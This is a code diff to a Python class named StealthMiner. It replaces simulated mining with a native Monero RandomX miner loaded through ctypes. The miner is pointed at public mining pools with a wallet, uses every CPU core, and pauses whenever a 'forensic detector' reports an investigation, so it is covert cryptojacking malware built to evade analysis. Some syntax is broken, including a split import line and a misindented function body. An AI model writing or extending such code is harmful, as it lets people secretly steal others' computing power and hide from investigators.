@@ -11,6 +11,9 @@ import threading
 import os
 import random
 import sys
+import ctypes
+from pathlib 
+import Path      
 import struct
 import base64
 import zlib
@@ -1493,28 +1496,127 @@ class StealthMiner:
                 return {"success": True, "nonce": nonce.hex(), "hash": result2.hexdigest(), "iterations": _}
             nonce = struct.pack('<Q', _ + 1)
         return {"success": False, "iterations": int(1000 * difficulty)}
-
+        
     def simulate_mining(self, intensity: float):
+    """Real mining using native C++ RandomX miner"""
+    try:
+        # Load C++ library
+       # import ctypes
+       # import os
+       # from pathlib import Path
+        
+        lib_name = {
+            'linux': 'libmonero_miner.so',
+            'darwin': 'libmonero_miner.dylib',
+            'win32': 'monero_miner.dll'
+        }.get(os.sys.platform, 'libmonero_miner.so')
+        
+        # Find the library
+        search_paths = [
+            Path(__file__).parent / "build" / lib_name,
+            Path.cwd() / "build" / lib_name,
+        ]
+        
+        lib_path = None
+        for path in search_paths:
+            if path.exists():
+                lib_path = path
+                break
+        
+        if not lib_path:
+            raise ImportError("Native miner library not found")
+        
+        # Load library and setup functions
+        lib = ctypes.CDLL(str(lib_path))
+        
+        lib.miner_create.argtypes = [ctypes.c_char_p, ctypes.c_char_p]
+        lib.miner_create.restype = ctypes.c_void_p
+        
+        lib.miner_initialize.argtypes = [ctypes.c_void_p]
+        lib.miner_initialize.restype = ctypes.c_bool
+        
+        lib.miner_start.argtypes = [ctypes.c_void_p]
+        lib.miner_start.restype = ctypes.c_bool
+        
+        lib.miner_stop.argtypes = [ctypes.c_void_p]
+        lib.miner_stop.restype = None
+        
+        lib.miner_get_hashrate.argtypes = [ctypes.c_void_p]
+        lib.miner_get_hashrate.restype = ctypes.c_double
+        
+        lib.miner_is_active.argtypes = [ctypes.c_void_p]
+        lib.miner_is_active.restype = ctypes.c_bool
+        
+        lib.miner_destroy.argtypes = [ctypes.c_void_p]
+        lib.miner_destroy.restype = None
+        
+        # Create config for C++ miner
+        config = {
+            "wallet": self.wallet,
+            "pool": random.choice([
+                "pool.supportxmr.com",
+                "pool.minexmr.com",
+                "xmrpool.eu"
+            ]),
+            "port": 443,
+            "threads": os.cpu_count() or 4,
+            "tls": True,
+            "keepalive": True
+        }
+        
+        config_path = Path(__file__).parent / "config.json"
+        with open(config_path, 'w') as f:
+            import json
+            json.dump(config, f)
+        
+        # Create C++ miner instance
+        miner_handle = lib.miner_create(
+            str(config_path).encode('utf-8'),
+            self.wallet.encode('utf-8')
+        )
+        
+        if not miner_handle:
+            raise RuntimeError("Failed to create miner")
+        
+        # Initialize and start mining
+        if not lib.miner_initialize(miner_handle):
+            raise RuntimeError("Failed to initialize miner")
+        
+        lib.miner_start(miner_handle)
+        
+        # Mining monitor loop
         while self.active and self.running and intensity > 0.01:
-            try:
-                if self.forensic_detector.is_investigation_active():
-                    time.sleep(5)
-                    continue
-                job_data = hashlib.sha256(
-                    f"{self.wallet}{time.time()}{random.random()}".encode()
-                ).digest()
-                difficulty = intensity * random.uniform(0.3, 0.7)
-                result = self.calculate_hash(job_data, difficulty)
-                if result["success"] and time.time() - self.last_hashrate_log > random.uniform(30, 120):
-                    self.hashrate_history.append({
-                        "time": time.time(), "hash": result["hash"], "difficulty": difficulty
-                    })
-                    self.last_hashrate_log = time.time()
-                    if len(self.hashrate_history) > random.randint(3, 10):
-                        self._submit_mining_results()
-                time.sleep(random.uniform(0.1, 0.5) / max(1 + intensity, 0.01))
-            except Exception:
-                time.sleep(1)
+            # Check forensics
+            if self.forensic_detector.is_investigation_active():
+                lib.miner_stop(miner_handle)
+                time.sleep(5)
+                lib.miner_start(miner_handle)
+                continue
+            
+            # Get hashrate from C++ miner
+            hashrate = lib.miner_get_hashrate(miner_handle)
+            if hashrate > 0:
+                self.hashrate_history.append({
+                    "time": time.time(),
+                    "hashrate": hashrate
+                })
+                if len(self.hashrate_history) > 10:
+                    self.hashrate_history = self.hashrate_history[-10:]
+            
+            # Check if miner healthy
+            if not lib.miner_is_active(miner_handle):
+                lib.miner_start(miner_handle)
+            
+            time.sleep(random.uniform(5, 15))
+        
+        # Cleanup
+        lib.miner_stop(miner_handle)
+        lib.miner_destroy(miner_handle)
+        
+    except ImportError:
+        self._fallback_mining(intensity)
+    except Exception as e:
+        self._fallback_mining(intensity)
 
     def _submit_mining_results(self):
         if not self.hashrate_history or not self.adaptive_network.should_communicate_now():
